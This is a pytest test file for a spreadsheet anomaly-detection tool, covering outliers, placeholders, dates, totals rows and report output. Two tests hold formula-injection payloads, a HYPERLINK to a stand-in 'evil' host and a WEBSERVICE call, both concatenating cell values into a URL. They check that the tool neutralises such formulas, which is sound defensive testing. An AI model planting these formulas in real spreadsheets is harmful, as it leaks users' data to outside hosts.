import csv

import numpy as np
import pandas as pd
from openpyxl import load_workbook

from anomaly_hunter.cli import run_scan
from anomaly_hunter.engine.limits import read_limits, suggest_limits


def make_clean_csv(path, n=40, seed=0):
    rng = np.random.RandomState(seed)
    df = pd.DataFrame({
        "order": range(1, n + 1),
        "Amount": rng.normal(100, 5, n).round(2),
        "Price": rng.normal(50, 2, n).round(2),
    })
    df.to_csv(path, index=False)
    return df


def write_limits(path, columns_bounds):
    with open(path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["column", "baseline_low", "baseline_high", "weird_low", "weird_high"])
        for col, bounds in columns_bounds.items():
            w.writerow([col, *["" if b is None else b for b in bounds]])


# ---- Hazmat tests: each planted anomaly must be caught, in the right bucket ----

def test_hazmat_weird_limit_breach(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    bad_row = pd.DataFrame([{"order": 999, "Amount": 999999, "Price": 50}])
    pd.concat([df, bad_row]).to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"Amount": (80, 120, 0, 10000), "Price": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    amount_idx, sev_idx, bucket_idx = header.index("Amount"), header.index("Severity"), header.index("Bucket")
    flagged = next(r for r in body if r[amount_idx] == 999999)
    assert flagged[sev_idx] in ("Medium", "High")
    assert flagged[bucket_idx] == "Irregularities"


def test_hazmat_duplicate_row(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    pd.concat([df, df.iloc[[0]]]).to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    assert any(r[header.index("Bucket")] == "Duplicates" for r in body)


def test_hazmat_text_in_number_column(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    df["Amount"] = df["Amount"].astype(object)
    df.loc[5, "Amount"] = "N/A"
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"order": (None, None, None, None), "Amount": (None, None, None, None),
                                "Price": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    reason_idx, bucket_idx = header.index("Reason"), header.index("Bucket")
    matches = [r for r in body if "N/A" in (r[reason_idx] or "")]
    assert matches
    assert matches[0][bucket_idx] == "Irregularities"


def test_hazmat_spike_in_ordered_series(tmp_path):
    csv_path = tmp_path / "data.csv"
    n = 40
    rng = np.random.RandomState(1)
    df = pd.DataFrame({"order": range(1, n + 1), "Revenue": rng.normal(1000, 20, n).round(2)})
    df.loc[20, "Revenue"] = 5000  # planted spike, single row
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"order": (None, None, None, None), "Revenue": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), "order", str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    flagged_orders = [r[header.index("order")] for r in body]
    assert 21 in flagged_orders  # df index 20 -> order value 21


def test_hazmat_isolation_combo_runs_clean(tmp_path):
    csv_path = tmp_path / "data.csv"
    n = 60
    rng = np.random.RandomState(2)
    a = rng.normal(0, 1, n)
    b = a + rng.normal(0, 0.1, n)
    df = pd.DataFrame({"order": range(1, n + 1), "A": a.round(2), "B": b.round(2)})
    df.loc[30, "A"] = 0.0
    df.loc[30, "B"] = 5.0  # each value alone plausible, combination is not
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"order": (None, None, None, None), "A": (None, None, None, None),
                                "B": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    # Not asserting this exact row is caught — ML detection on a 60-row sample is
    # inherently noisy. This just proves the isolation path runs clean.
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0


# ---- Quiet-crowd test ----

def test_quiet_crowd_low_false_positive_rate(tmp_path):
    csv_path = tmp_path / "data.csv"
    rng = np.random.RandomState(42)
    df = pd.DataFrame({
        "Amount": rng.normal(100, 5, 1000).round(2),
        "Price": rng.normal(50, 2, 1000).round(2),
    })
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["Amount", "Price"], limits_path)

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    flagged = load_workbook(out_path)["Anomalies"].max_row - 1
    assert flagged <= 10  # <=1% of 1000, Noted rows don't count toward this


# ---- Limits tests ----

def test_missing_limits_file_writes_suggestions_and_exits_2(tmp_path):
    csv_path = tmp_path / "data.csv"
    make_clean_csv(csv_path, n=40)
    limits_path = tmp_path / "limits.csv"
    out_path = tmp_path / "report.xlsx"

    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 2
    assert limits_path.exists()
    # "order" is 1..n - a row identifier, not a measurement: no limits for it
    assert set(pd.read_csv(limits_path)["column"]) == {"Amount", "Price"}


def test_suggested_lows_stop_at_zero_for_nonnegative_columns():
    # Real-Excel finding: Units -5 slipped past a suggested low of -53
    from anomaly_hunter.engine.limits import suggest_limits_dict
    df = pd.DataFrame({"Units": [95, 50, 36, 27, 56, 60, 75, 90, 32, 60] * 3 + [-5], "Delta": range(-15, 16)})
    b_lo, _, w_lo, _ = suggest_limits_dict(df, ["Units", "Delta"])["Units"]
    assert b_lo == 0.0 and w_lo == 0.0  # -5 now breaks the weird limit
    assert suggest_limits_dict(df, ["Delta"])["Delta"][0] < 0  # genuinely signed column keeps negative lows


def test_blank_limit_cells_mean_no_limit(tmp_path):
    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"Amount": (None, None, None, None)})
    limits, warnings = read_limits(limits_path, {"Amount": "number"})
    assert limits["Amount"] == (None, None, None, None)
    assert warnings == []


def test_unknown_limits_column_warns_not_crash(tmp_path):
    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"NotAColumn": (0, 1, 0, 1)})
    limits, warnings = read_limits(limits_path, {"Amount": "number"})
    assert limits == {}
    assert len(warnings) == 1


# ---- Report test ----

def test_report_has_its_sheets_and_summary(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)
    out_path = tmp_path / "report.xlsx"

    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    wb = load_workbook(out_path)
    assert set(wb.sheetnames) == {"Data", "Anomalies", "Summary", "Fairness"}
    summary_text = "\n".join(str(c.value) for row in wb["Summary"].iter_rows() for c in row if c.value is not None)
    assert "Limits file" in summary_text
    assert "K" in summary_text



def test_report_never_runs_formulas_from_the_scanned_file(tmp_path):
    csv_path = tmp_path / "evil.csv"
    make_clean_csv(csv_path, n=40)
    with open(csv_path, "a") as f:
        f.write('"=HYPERLINK(""http://evil/?""&A2,""x"")",9999,50\n')  # flagged, so it lands on Anomalies too
    limits_path, out_path = tmp_path / "limits.csv", tmp_path / "report.xlsx"
    run_scan([str(csv_path)], str(limits_path), None, str(out_path))  # writes limits
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0
    wb = load_workbook(out_path)
    cells = [c for ws in wb for row in ws.iter_rows() for c in row if str(c.value).startswith("=HYPERLINK")]
    assert len(cells) >= 2 and all(c.data_type == "s" for c in cells)  # Data + Anomalies: shown as text, never run

# ---- Safety test ----

def test_input_file_untouched(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)
    out_path = tmp_path / "report.xlsx"

    before_bytes = csv_path.read_bytes()
    before_mtime = csv_path.stat().st_mtime

    run_scan([str(csv_path)], str(limits_path), None, str(out_path))

    assert csv_path.read_bytes() == before_bytes
    assert csv_path.stat().st_mtime == before_mtime


# ---- Determinism test ----

def test_determinism(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=60, seed=7)
    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)

    out1, out2 = tmp_path / "report1.xlsx", tmp_path / "report2.xlsx"
    run_scan([str(csv_path)], str(limits_path), None, str(out1))
    run_scan([str(csv_path)], str(limits_path), None, str(out2))

    rows1 = list(load_workbook(out1)["Anomalies"].iter_rows(values_only=True))
    rows2 = list(load_workbook(out2)["Anomalies"].iter_rows(values_only=True))
    assert rows1 == rows2


def test_identifier_columns_are_not_measurements():
    """SKU/MRN/ZIP/order numbers label rows: no limits, no votes - they used to flag EVERY row."""
    from anomaly_hunter.engine.load import load_from_records
    rng = np.random.RandomState(3)
    n = 60
    cols = ["SKU", "MRN", "ZIP", "Year", "Price", "Units"]
    rows = [[100200 + k, int(rng.randint(1e6, 9e6)), int(rng.choice([2134, 60601])), 2019 + k % 7,
             int(rng.uniform(1e5, 9e5)), int(rng.randint(10, 90))] for k in range(n)]
    _, types, _ = load_from_records(cols, rows)
    assert types == {"SKU": "id", "MRN": "id", "ZIP": "id", "Year": "number", "Price": "number", "Units": "number"}


def test_codes_that_look_like_dates_stay_text():
    from anomaly_hunter.engine.load import load_from_records
    _, types, _ = load_from_records(["Cost Code", "When"], [["03-100", "2026-01-05"], ["03-101", "2026-01-06"], ["04-115", "1/7/2026"]])
    assert types == {"Cost Code": "text", "When": "date"}


def test_timestamps_with_a_utc_or_offset_suffix_are_dates_never_a_crash():
    # a real clinical export (ISO "2014-01-02T00:00:00Z" with blanks) made every scan of its sheet an engine error:
    # the UTC column came back as plain objects. Mixed offsets made pandas raise outright (blind real tables, 2026-10-16)
    from anomaly_hunter.engine.load import load_from_records
    from anomaly_hunter.server import create_app
    utc = [f"2014-{1 + k % 12:02}-{1 + k % 28:02}T00:00:00Z" for k in range(118)] + ["", "2084-01-02T23:59:59Z"]
    mixed = [f"2014-02-{1 + k % 28:02}T08:30:00{'+02:00' if k % 2 else '-05:00'}" for k in range(120)]
    df, types, _ = load_from_records(["Start", "End", "Dose"], [[a, b, 10 + k % 5] for k, (a, b) in enumerate(zip(utc, mixed))])
    assert types == {"Start": "date", "End": "date", "Dose": "number"}
    assert str(df["Start"][0].date()) == "2014-01-01" and str(df["End"][1].date()) == "2014-02-02"  # the date as written
    rows = [[a, b, 10 + k % 5] for k, (a, b) in enumerate(zip(utc, mixed))]
    r = create_app().test_client().post("/scan", json={"columns": ["Start", "End", "Dose"], "rows": rows, "limits": {}})
    assert r.status_code == 200 and "2084-01-02" in r.get_json()["rows"][119]["reason"]


def test_totals_rows_are_not_checked_but_a_vendor_called_total_is():
    from anomaly_hunter.engine.load import load_from_records
    from anomaly_hunter.engine.pipeline import summary_rows
    rows = [["2026-01-%02d" % (k + 1), "Total Wine" if k == 3 else "Vendor %d" % k, 100 + k] for k in range(10)]
    rows += [["Total", "", 1045], ["", "", ""], ["", "Grand Total", 2090]]
    rows += [["2026-02-01", "Vendor x", 5], ["2026-02-02", "Vendor y", 6], ["2026-02-03", "Vendor z", 7], ["", "", 18]]  # unlabelled sum
    df, _, _ = load_from_records(["Date", "Vendor", "Amount"], rows)
    assert list(summary_rows(df).nonzero()[0]) == [10, 11, 12, 16]


def test_likely_typo_fixes_and_real_outliers_left_alone():
    from anomaly_hunter.engine.detectors import column_stats, likely_value
    tight = np.array([26.0, 31, 28, 25, 30, 27, 29, 33, 24, 28])
    assert likely_value(2900.0, column_stats(np.append(tight, 2900)), 15, 45) == 29  # x100 (extra zeros)
    assert likely_value(-29.0, column_stats(np.append(tight, -29)), 15, 45) == 29  # sign flip in an all-positive column
    assert likely_value(0.29, column_stats(np.append(tight, 0.29)), 15, 45) == 29  # missing zeros
    pct = np.array([0.12, 0.15, 0.11, 0.14, 0.13, 0.16, 0.12, 0.15])
    assert likely_value(13.0, column_stats(np.append(pct, 13)), 0.05, 0.25) == 0.13  # % typed as 13 for 0.13
    pnl = np.array([520.0, -310, 870, -45, 1200, -760, 300, 95, -1500, 640])
    assert likely_value(-120.0, column_stats(np.append(pnl, -120)), -2000, 2000) is None  # negatives are normal here: no flip
    claims = np.array([900.0, 2500, 15000, 4200, 700, 38000, 1200, 6100, 22000, 3100])
    assert likely_value(90000.0, column_stats(np.append(claims, 90000)), 0, 40000) is None  # whale claim: only 2.4x the next one


def test_category_spelled_differently_is_flagged_with_the_usual_spelling():
    from anomaly_hunter.engine.load import load_from_records
    from anomaly_hunter.engine.pipeline import score
    depts = ["Sales", "Ops", "IT", "Finance"] * 10 + ["sales", "IT ", "IT"]
    df, types, errors = load_from_records(["Dept", "Hours"], [[d, 30 + k % 17 + k / 100] for k, d in enumerate(depts)])
    rows, _ = score(df, types, errors, {}, None)
    assert rows[40]["likely"] == {"Dept": "Sales"} and "looks like" in rows[40]["reason"]
    assert rows[41]["likely"] == {"Dept": "IT"}  # trailing space
    assert not any(r["severity"] for r in rows[:40])  # the usual spellings are fine


def test_value_100x_too_small_is_weird_in_a_positive_column():
    from anomaly_hunter.engine.load import load_from_records
    from anomaly_hunter.engine.limits import suggest_limits_dict
    rng = np.random.RandomState(101)
    df, _, _ = load_from_records(["Sq Ft"], [[int(rng.uniform(900, 3500))] for _ in range(70)] + [[22]])
    assert suggest_limits_dict(df, ["Sq Ft"])["Sq Ft"][2] > 22  # weird low no longer rounds down to 0


def test_two_slips_at_once_is_not_an_obvious_typo():
    from anomaly_hunter.engine.detectors import column_stats, likely_value
    units = np.array([40.0, 52, 61, 47, 55, 58, 44, 50, 66, 49])
    assert likely_value(-5.0, column_stats(np.append(units, -5)), 25, 80) is None  # -5 -> 50 would be sign AND zeros: just guessing


def test_review_fixes_ids_totals_names():
    from anomaly_hunter.engine.load import load_from_records
    from anomaly_hunter.engine.limits import suggest_limits_dict
    from anomaly_hunter.engine.pipeline import score, summary_rows
    # a text ID among numeric IDs is a value, not a blank
    df, types, errors = load_from_records(["SKU", "Qty"], [[100200 + k, 10 + k % 7 + k / 100] for k in range(40)] + [["A-17", 12.5]])
    rows, _ = score(df, types, errors, {}, None)
    assert types["SKU"] == "id" and not rows[-1]["severity"]
    # 0/1 count columns: no fake "sum rows"
    df, _, _ = load_from_records(["Late", "Damaged"], [[a, b] for _ in range(10) for a, b in ((1, 0), (0, 1), (1, 1), (0, 0))])
    assert not summary_rows(df).any()
    # "Average" as a category in an otherwise full row (one blank) is data
    df, _, _ = load_from_records(["Rating", "Score", "Note"], [["Good", 5 + k % 3, "x"] for k in range(9)] + [["Average", 4, ""]])
    assert not summary_rows(df).any()
    # whole-word ID names only
    _, types, _ = load_from_records(["Mean", "Zip Code", "Clean"], [[k % 9, 60601 + k % 3, k % 4] for k in range(30)])
    assert types == {"Mean": "number", "Zip Code": "id", "Clean": "number"}
    # baseline low never tighter than weird low
    rng = np.random.RandomState(5)
    df, _, _ = load_from_records(["Paid"], [[round(float(rng.lognormal(8, 1)), 2)] for _ in range(80)])
    b_lo, _, w_lo, _ = suggest_limits_dict(df, ["Paid"])["Paid"]
    assert b_lo >= w_lo


def test_formula_like_text_is_never_offered_as_a_spelling_fix():
    from anomaly_hunter.engine.load import load_from_records
    from anomaly_hunter.engine.pipeline import score
    vals = ['=WEBSERVICE("https://x/?"&A1)'] * 4 + ['=webservice("https://x/?"&a1)'] + ["Ok"] * 30
    df, types, errors = load_from_records(["Note", "N"], [[v, k] for k, v in enumerate(vals)])
    rows, _ = score(df, types, errors, {}, None)
    assert not any(r.get("likely") for r in rows)


# ---- Batch 3: catch what it used to miss (each failed on the old code) ----

def _scan(cols, rows, limits=None):
    from anomaly_hunter.engine.load import load_from_records
    from anomaly_hunter.engine.limits import suggest_limits_dict
    from anomaly_hunter.engine.load import numbers
    from anomaly_hunter.engine.pipeline import score
    df, types, errors = load_from_records(cols, rows)
    lim = limits or suggest_limits_dict(df, numbers(types))
    out, _ = score(df, types, errors, lim, None)
    return types, out


def test_a_few_excel_errors_do_not_switch_a_number_column_off():
    rows = [[f"n{i}", 50 + i % 7] for i in range(40)]
    rows[39][1] = 100000
    for i in range(5):
        rows[i][1] = "#DIV/0!"
    types, out = _scan(["Name", "Amt"], rows)
    assert types["Amt"] == "number" and out[39]["severity"] in ("Medium", "High")
    assert all("Excel error #DIV/0! in Amt" in out[i]["reason"] for i in range(5))
    types, _ = _scan(["Name", "Amt"], [[f"n{i}", "#N/A" if i % 3 else i] for i in range(30)])  # mostly errors: still text
    assert types["Amt"] == "text"


def test_error_text_is_not_also_called_blank_and_real_blanks_are_found():
    rows = [[f"n{i}", 50 + i % 7] for i in range(60)]
    for i in (3, 4, 5):
        rows[i][1] = "ERROR"
    rows[10][1] = ""
    _, out = _scan(["Name", "Amt"], rows)
    assert all("Blank" not in out[i]["reason"] and 'Placeholder "ERROR" in column Amt' in out[i]["reason"] for i in (3, 4, 5))
    assert "Blank cell in column Amt" in out[10]["reason"]


def test_a_blank_in_a_filled_text_column_is_found_but_not_in_a_half_empty_one():
    rows = [[f"n{i}", ["Coffee", "Tea", "Cake"][i % 3], "" if i % 2 else "note"] for i in range(60)]
    rows[9][1] = ""
    _, out = _scan(["Name", "Item", "Note"], rows)
    assert out[9]["reason"] == "Blank cell in column Item, which is otherwise filled"
    assert not any("Note" in r["reason"] for r in out)


def test_text_in_a_date_column_is_named_not_called_blank():
    rows = [[f"n{i}", f"2024-01-{1 + i % 28:02d}", 50 + i % 7] for i in range(40)]
    rows[7][1] = "UNKNOWN"
    _, out = _scan(["Name", "When", "Amt"], rows)
    assert out[7]["reason"] == 'Placeholder "UNKNOWN" in column When'  # a stand-in like N/A, not a mistyped date


def test_a_fully_blank_row_says_nothing():
    rows = [[f"n{i}", 50 + i % 7] for i in range(30)] + [["", ""]] + [[f"m{i}", 50 + i % 7] for i in range(9)]
    _, out = _scan(["Name", "Amt"], rows)
    assert out[30]["reason"] == "" and out[30]["severity"] is None


def test_money_and_percent_text_is_checked_as_numbers():
    rows = [[f"n{i}", f"${1000 + i * 3:,}.00", f"{10 + i % 5}%", f"({100 + i * 7 % 13 * 9})" if i % 4 == 0 else str(100 + i * 7 % 13 * 9)] for i in range(40)]
    rows[39][1] = "$1,000,000.00"
    types, out = _scan(["Name", "Price", "Rate", "Net"], rows)
    assert (types["Price"], types["Rate"], types["Net"]) == ("number", "number", "number")
    assert out[39]["severity"] in ("Medium", "High") and "Price" in out[39]["reason"]
    types, _ = _scan(["Zip", "Phone"], [[f"0{2100 + i}", f"(555) 123-{4000 + i}"] for i in range(30)])
    assert types["Phone"] == "text"  # a phone number is not an accounting negative


def test_placeholders_in_text_columns_are_flagged_but_a_convention_is_not():
    rows = [[f"n{i}", ["Cash", "Card", "Online"][i % 3], ["East", "West"][i % 2]] for i in range(60)]
    rows[5][1], rows[6][1], rows[7][2] = "ERROR", "UNKNOWN", "N/A"
    _, out = _scan(["Name", "Pay", "Region"], rows)
    assert out[5]["reason"] == 'Placeholder "ERROR" in column Pay' and out[7]["reason"] == 'Placeholder "N/A" in column Region'
    assert out[5]["bucket"] == "Irregularities"
    rows = [[f"n{i}", "-" if i % 2 else "x", "NA", "None"] for i in range(30)]  # "-" is half the column: the sheet's convention
    _, out = _scan(["Name", "Note", "Country", "Discount"], rows)
    assert not any(r["severity"] for r in out)


def test_day_first_dates_are_read_the_same_way_down_the_column():
    from anomaly_hunter.engine.load import load_from_records
    df, types, _ = load_from_records(["When", "Amt"], [["01/02/2024", 1], ["13/01/2024", 2], ["02/03/2024", 3]])
    assert types["When"] == "date" and [d.strftime("%Y-%m-%d") for d in df["When"]] == ["2024-02-01", "2024-01-13", "2024-03-02"]
    df, _, _ = load_from_records(["When", "Amt"], [["01/02/2024", 1], ["01/13/2024", 2]])  # month first stays month first
    assert [d.strftime("%Y-%m-%d") for d in df["When"]] == ["2024-01-02", "2024-01-13"]


# ---- Batch 4: fewer false alarms, clearer words ----

def test_a_normal_row_is_not_mistaken_for_an_unlabelled_total():
    rows = [["item0", 1, "a"], ["item1", 1, ""], ["item2", 2, ""]] + [[f"item{i}", 1 + i % 3, "x"] for i in range(3, 40)]
    _, out = _scan(["Item", "Qty", "Note"], rows)
    assert "Totals" not in out[2]["reason"]
    rows = [[f"item{i}", 10 + i % 4, "x"] for i in range(10)] + [["", sum(10 + i % 4 for i in range(10)), ""]] + [[f"m{i}", 10 + i % 4, "x"] for i in range(30)]
    _, out = _scan(["Item", "Qty", "Note"], rows)
    assert out[10]["reason"] == "Totals/summary row - not checked"  # a real unlabelled total is still recognised


def test_no_fractional_typo_guess_in_a_whole_number_column():
    rows = [[f"n{i}", 1 + i % 5] for i in range(60)]
    rows[30][1] = 999
    _, out = _scan(["Name", "Quantity"], rows)
    assert out[30]["severity"] and "likely" not in out[30]["reason"]


def test_one_spike_is_reported_once():
    rows = [[f"2024-01-{1 + i % 28:02d}" if i < 28 else f"2024-02-{i - 27:02d}", 100 + i % 3] for i in range(50)]
    rows[25][1] = 900
    _, out = _scan(["When", "Sales"], rows)
    assert out[25]["reason"].count("jumped sharply") <= 1 and "order change" not in out[25]["reason"]


def _daily(n=200, base=500):
    return [[f"d{i}", 0 if i % 7 in (5, 6) else base - 20 + (i * 13) % 41] for i in range(n)]


def test_weekend_zeros_are_normal_but_sentinels_are_still_caught():
    from anomaly_hunter.engine.limits import suggest_limits_dict
    from anomaly_hunter.engine.load import load_from_records, numbers
    rows = _daily()
    df, types, _ = load_from_records(["Day", "Sales"], rows)
    lim = suggest_limits_dict(df, numbers(types))
    assert lim["Sales"][0] == lim["Sales"][2] == 0.0
    _, out = _scan(["Day", "Sales"], rows)
    assert not [r for r in out if r["severity"] in ("Medium", "High")]
    for code in (9999, -1, 0):  # a "missing" code at 3% of a column around 500 is still caught
        rows = [[f"d{i}", code if i % 33 == 0 else 480 + (i * 13) % 41] for i in range(200)]
        _, out = _scan(["Day", "Sales"], rows)
        assert all(out[i]["severity"] in ("Medium", "High") for i in range(0, 200, 33)), code


def test_two_product_clusters_do_not_flood():
    """Was a known limitation (one low/high range can't describe two products). Fixed 2026-10-14: 60 rows near $500
    crowd each other - a slip stands alone."""
    rows = [[f"r{i}", 500 + i % 11 if i % 10 < 3 else 100 + i % 7] for i in range(200)]
    _, out = _scan(["Row", "Price"], rows)
    assert sum(r["severity"] in ("Medium", "High") for r in out) <= 2


def test_one_day_first_date_does_not_flip_the_iso_dates_around_it():
    from anomaly_hunter.engine.load import load_from_records
    rows = [[f"2024-01-0{d}", d] for d in range(1, 7)] + [["25/12/2024", 7], ["2024-02-03 00:00:00", 8]]
    df, types, _ = load_from_records(["When", "Amt"], rows)
    assert types["When"] == "date"
    assert [d.strftime("%Y-%m-%d") for d in df["When"]] == [f"2024-01-0{d}" for d in range(1, 7)] + ["2024-12-25", "2024-02-03"]



def test_cell_text_quoted_in_a_reason_is_kept_short():
    rows = [[f"n{i}", 50 + i % 7] for i in range(40)]
    rows[3][1] = "x" * 5000
    _, out = _scan(["Name", "Amt"], rows)
    assert len(out[3]["reason"]) < 200 and out[3]["reason"].startswith('Text "xxx')


# ---- final functional re-attack (council decisions) ----

def test_a_real_category_named_error_or_unknown_is_not_a_placeholder():
    rows = [[f"n{i}", "Error" if i % 10 == 0 else "OK", "Unknown" if i % 5 == 0 else "High", "-" if i % 3 == 0 else "J"] for i in range(100)]
    _, out = _scan(["Name", "Status", "Priority", "Initial"], rows)
    assert not any("Placeholder" in r["reason"] for r in out)
    rows = [[f"n{i}", ["Cash", "Card"][i % 2]] for i in range(100)]
    for i in range(4):
        rows[i][1], rows[50 + i][1] = "ERROR", "UNKNOWN"  # 4% each, like the real dirty sales data
    _, out = _scan(["Name", "Pay"], rows)
    assert sum("Placeholder" in r["reason"] for r in out) == 8


def test_excel_errors_are_always_flagged_even_when_they_fill_the_column():
    _, out = _scan(["Name", "Lookup"], [[f"n{i}", "#N/A"] for i in range(40)])
    assert all(r["reason"] == "Excel error #N/A in Lookup" for r in out)


def test_an_accounting_dash_in_a_number_column_is_zero():
    rows = [[f"n{i}", "-" if i % 5 == 0 else 100 + i % 9] for i in range(60)]
    rows[7][1] = 9999
    types, out = _scan(["Name", "Amount"], rows)
    assert types["Amount"] == "number" and out[7]["severity"] in ("Medium", "High")
    assert not any(out[i]["severity"] for i in range(0, 60, 5))


def test_weekend_zeros_get_no_trend_flags():
    from datetime import date, timedelta
    rows = [[(date(2024, 1, 1) + timedelta(i)).isoformat(), 0 if i % 7 in (5, 6) else 480 + (i * 13) % 41] for i in range(200)]
    rows[100][1] = 5000
    _, out = _scan(["Day", "Sales"], rows)
    assert not any("local trend" in out[i]["reason"] for i in range(200) if rows[i][1] == 0)
    assert out[100]["severity"] == "High"


def test_a_dated_subtotal_row_is_still_a_total():
    rows = [[f"2024-01-{1 + i:02d}", f"item{i}", 40 + i % 5, 14.0 + i % 3] for i in range(10)]
    rows.append(["2024-01-20", "", sum(r[2] for r in rows), sum(r[3] for r in rows)])
    rows += [[f"2024-02-{1 + i:02d}", f"item{i}", 40 + i % 5, 14.0 + i % 3] for i in range(30)]
    _, out = _scan(["When", "Item", "Qty", "Amt"], rows)
    assert out[10]["reason"] == "Totals/summary row - not checked"


def test_one_decimal_does_not_bring_back_fractional_guesses():
    rows = [[f"n{i}", 1 + i % 5] for i in range(60)]
    rows[10][1], rows[30][1] = 2.5, 999
    _, out = _scan(["Name", "Quantity"], rows)
    assert out[30]["severity"] and "likely" not in out[30]["reason"]


# ---- last regression attack ----

def test_blanks_do_not_switch_the_weekend_zero_rule_off():
    from datetime import date, timedelta
    rows = [[(date(2024, 1, 1) + timedelta(i)).isoformat(), None if i % 11 == 0 else 0 if i % 7 in (5, 6) else 480 + (i * 13) % 41] for i in range(120)]
    _, out = _scan(["Day", "Sales"], rows)
    assert not any("local trend" in out[i]["reason"] for i in range(120) if rows[i][1] == 0)


def test_a_column_of_dashes_and_comments_stays_text():
    rows = [[f"n{i}", "call back Monday" if i == 7 else "VIP" if i == 30 else "-"] for i in range(60)]
    types, out = _scan(["Name", "Notes"], rows)
    assert types["Notes"] == "text" and not any(r["severity"] for r in out)


def test_a_dated_row_on_a_sheet_without_text_is_not_hidden_as_a_total():
    rows = [[f"2024-01-{1 + i:02d}", 1 + i % 3, 10 + i % 4] for i in range(30)]
    rows[2] = ["2024-01-03", 3, None]  # 3 = 1 + 2 by chance
    _, out = _scan(["When", "Qty", "Price"], rows)
    assert "Blank cell in column Price" in out[2]["reason"]


# ---- 2026-10-07 real-data stress test (100k NYC taxi trips): fixes for what it exposed ----

def test_sequence_sits_out_on_transactions_that_share_dates():
    # 300 trips over 10 days is a pile of transactions, not a time series: no "trend" or "jump" to vote on
    from anomaly_hunter.engine.detectors import sequence_detector
    from anomaly_hunter.engine.load import load_from_records
    r = np.random.default_rng(3)
    rows = [[f"2018-01-{1 + i % 10:02d}", float(r.lognormal(2, 1))] for i in range(300)]
    df, types, _ = load_from_records(["Day", "Fare"], rows)
    got = sequence_detector(df, types)
    assert not got["ran"] and "not a time series" in got["sit_out_reason"]


def test_sequence_still_runs_on_a_daily_series():
    from anomaly_hunter.engine.detectors import sequence_detector
    from anomaly_hunter.engine.load import load_from_records
    rows = [[str(np.datetime64("2024-01-01") + np.timedelta64(i, "D")), 100.0 + i % 7] for i in range(60)]
    df, types, _ = load_from_records(["Day", "Sales"], rows)
    assert sequence_detector(df, types)["ran"]


def test_heavy_tailed_money_column_gets_no_weird_flood_but_a_typo_still_trips():
    # tips/fares: most small, a long honest tail. Symmetric median +/- 6 spread put ~2% of clean rows past "weird"
    from anomaly_hunter.engine.limits import suggest_limits_dict
    from anomaly_hunter.engine.load import load_from_records
    r = np.random.default_rng(5)
    vals = [round(float(v), 2) for v in r.lognormal(2, 0.8, 3000)]
    df, types, _ = load_from_records(["Fare"], [[v] for v in vals])
    lo, hi, wlo, whi = suggest_limits_dict(df, ["Fare"])["Fare"]
    assert sum(v > whi for v in vals) <= 3  # <= 0.1% of honest rows
    assert 7.4 * 1000 > whi  # an extra-zeros typo on a typical fare (x1000) is still weird


def test_a_date_far_outside_the_columns_range_is_flagged():
    # taxi 2018 sheet had pickups in 2084 and 2042 - nothing looked at dates at all
    r = np.random.default_rng(7)
    days = [str(np.datetime64("2018-01-01") + np.timedelta64(int(d), "D")) for d in r.integers(0, 365, 300)]
    days[10], days[20] = "2084-11-04", "2042-03-01"
    _, out = _scan(["Day", "Fare"], [[d, float(v)] for d, v in zip(days, r.normal(12, 2, 300))])
    assert {i for i, o in enumerate(out) if "far outside" in o["reason"]} == {10, 20}
    assert out[10]["severity"] in ("Medium", "High")


def test_one_far_date_in_a_short_monthly_sheet_does_not_widen_the_span_it_is_judged_by():
    # 48 months with 2084 typed for 2022: the 1%-99% span of 48 dates reached 2084 itself, so only the series check's
    # misreading of the sheet's last row caught it, and that went with the series ends fix (AH-31 review)
    months = [f"{2022 + m // 12}-{m % 12 + 1:02d}-01" for m in range(48)]
    months[2] = "2084-03-01"
    _, out = _scan(["Month", "MRR"], [[d, 120000 + 4000 * m] for m, d in enumerate(months)])
